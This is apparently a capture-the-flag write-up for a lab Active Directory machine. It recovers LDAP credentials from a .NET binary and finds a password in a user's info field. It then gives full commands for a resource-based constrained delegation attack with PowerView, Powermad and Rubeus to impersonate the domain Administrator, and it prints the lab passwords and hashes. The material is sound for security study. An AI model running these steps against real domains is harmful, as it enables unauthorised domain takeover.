## Foothold: reversing UserInfo.exe

```
file UserInfo.exe
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

.NET assembly — unlike a native C/C++ binary, .NET bytecode keeps a lot of readable structure, so it's easy to inspect even without the source.

```
mono UserInfo.exe

Commands:
  find    Find a user
  user    Get information about a user
```

```
mono UserInfo.exe -v find -first 0x4147
[*] LDAP query to use: (givenName=0x4147)
[-] Exception: No Such Object
```

It performs LDAP queries, so it must have a bind account hardcoded somewhere. Two ways to get it:

- Decompile it (dnSpy/ILSpy): the credentials are XOR-obfuscated in the code — obfuscation alone isn't protection, since the key ships in the same binary.
- Sniff the traffic while it runs (Wireshark): LDAP on port 389 has no TLS, so the bind (the authentication step) travels in clear text. Anyone capturing the traffic sees the credentials.

## From ldap to support

```
bloodhound-python -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c All -ns 10.129.230.181
```

With valid (if low-privilege) credentials, a full BloodHound collection plus a raw LDAP dump let us check every attribute on every object, including free-text ones meant for admin notes:

```
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > ldap.out
```

The `support` user has a password sitting in its `info` field — a classic human error: using a generic descriptive field as a scratchpad.

```
cn: support
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

Membership in `Remote Management Users` means WinRM access:

```
nxc winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

## BloodHound: finding the path

Looking up `ldap` in BloodHound:

![alt text](/assets/img/posts/support/blood1.png)

The key distinction in BloodHound is direction: **Outbound Object Control** is what this node has power over (useful for attacking), while **Inbound Object Control** is who has power over this node (only useful defensively — it tells you who threatens *you*, not who you can reach):

![alt text](/assets/img/posts/support/blood2.png)

The inbound edges here (Domain Admins, Administrators, Account Operators → `ldap`) are just normal domain administration — those groups control almost everything by design, it's not an attack path.

The real path is through `support`: it's a member of **Shared Support Accounts**, which has **GenericAll** on the `DC` computer object — full control over the DC's AD object.

![alt text](/assets/img/posts/support/blood3.png)

GenericAll on a computer object points directly to **RBCD**.

## Privilege Escalation: RBCD

GenericAll on the DC's AD object doesn't mean OS-level access to the DC — the AD database and the underlying machine are separate layers. What GenericAll actually gives is write access to any attribute, including `msDS-AllowedToActOnBehalfOfOtherIdentity`.

This attribute tells AD which principals are allowed to impersonate any user when authenticating to that resource. It exists for legitimate service-to-service delegation (e.g. a web server acting on a user's behalf against a database). Abusing it just means writing your own principal into that attribute so *you* become the trusted delegate:

1. Create a computer account you fully control (you know its password/hash)
2. Write its SID into the DC's delegation attribute — now the DC trusts that computer to impersonate anyone
3. **S4U2Self**: your fake computer requests a ticket for itself, "on behalf of" Administrator — this step is always allowed to anyone, by design
4. **S4U2Proxy**: exchange that ticket for a real service ticket (e.g. CIFS) on the DC, still impersonating Administrator — this step only succeeds because of the delegation attribute you wrote in step 2

### Execution

Three tools, uploaded via evil-winrm: **PowerView.ps1** (read/write AD objects and attributes), **Powermad.ps1** (create machine accounts), **Rubeus.exe** (raw Kerberos operations — TGT/TGS requests, S4U).

```
*Evil-WinRM* PS C:\Programdata> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Programdata> Import-Module .\Powermad.ps1
```

Check `MachineAccountQuota` — by default any domain user can create up to this many computer accounts:

```
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

Confirm the delegation attribute is still empty:

```
Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl

name                                     : DC
msds-allowedtoactonbehalfofotheridentity :
```

Create the fake computer:

```
New-MachineAccount -MachineAccount 0x4147_computer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
[+] Machine account 0x4147_computer added
```

Build a security descriptor granting that computer's SID delegation rights, and write it to the DC's attribute:

```
$fakesid = Get-DomainComputer 0x4147_computer | select -expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-6101
AceType             : AccessAllowed
```

The SID matches our fake computer — the DC now trusts it for delegation. Get the RC4 hash for the fake account's password (Rubeus needs it to authenticate as that computer):

```
.\Rubeus.exe hash /password:Password123! /user:0x4147_computer /domain:support.htb
rc4_hmac : 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Run the S4U chain and inject the resulting ticket:

```
.\Rubeus.exe s4u /user:0x4147_computer$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt /dc:10.129.230.181

[+] S4U2self success!
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

### Loopback issue

Accessing `\\dc.support.htb\c$` from the same evil-winrm session fails with "Access is denied", even with a valid ticket for Administrator. The reason: this shell is already running *on* the DC, and Windows applies a loopback authentication restriction that ignores injected Kerberos tickets when the target resource is the local machine itself. The fix is to complete the attack from an external host, where this restriction doesn't apply.
